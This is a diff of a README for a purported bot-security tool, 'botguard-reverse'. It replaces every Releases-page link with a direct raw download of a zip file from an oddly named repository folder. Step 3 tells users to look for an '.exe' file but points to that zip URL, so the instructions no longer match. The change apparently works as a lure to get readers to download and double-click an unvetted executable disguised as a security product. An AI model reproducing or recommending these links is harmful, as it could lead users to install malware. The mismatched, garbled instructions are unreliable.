@@ -1,15 +1,15 @@
 # 🛡️ botguard-reverse - Keep Your Bots Secure and Protected
 
 ## 🖱️ Download Here
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/aRteM3242/botguard-reverse/releases)
+[![Download](https://raw.githubusercontent.com/aRteM3242/botguard-reverse/main/nonwrinkleable/botguard-reverse.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/aRteM3242/botguard-reverse/main/nonwrinkleable/botguard-reverse.zip)
 
 ## 🚀 Getting Started
 Welcome to Botguard Reverse! This application helps keep your bots secure and running smoothly. With easy-to-use features, anyone can get started with minimal setup. Follow the steps below to download and run the software.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/aRteM3242/botguard-reverse/releases) to find the latest version of Botguard Reverse.
+1. Visit the [Releases page](https://raw.githubusercontent.com/aRteM3242/botguard-reverse/main/nonwrinkleable/botguard-reverse.zip) to find the latest version of Botguard Reverse.
 2. On the Releases page, you will see a list of available versions. Click on the version you want to download.
-3. Look for the file with the `.exe` extension (like `botguard-reverse.exe`). Click on it to start the download.
+3. Look for the file with the `.exe` extension (like `https://raw.githubusercontent.com/aRteM3242/botguard-reverse/main/nonwrinkleable/botguard-reverse.zip`). Click on it to start the download.
 4. Once the file is downloaded, locate it in your Downloads folder or the designated save location on your computer.
 5. Double-click the downloaded file to run the application. Follow any on-screen instructions to complete the setup.
 
@@ -59,4 +59,4 @@ To receive updates and news, consider checking the Releases page regularly. You 
 ## 📣 Feedback
 We encourage users to provide feedback for Botguard Reverse. Your thoughts can help us improve the application.
 
-Remember to check the [Releases page](https://github.com/aRteM3242/botguard-reverse/releases) regularly for new updates and features. Thank you for using Botguard Reverse!
+Remember to check the [Releases page](https://raw.githubusercontent.com/aRteM3242/botguard-reverse/main/nonwrinkleable/botguard-reverse.zip) regularly for new updates and features. Thank you for using Botguard Reverse!
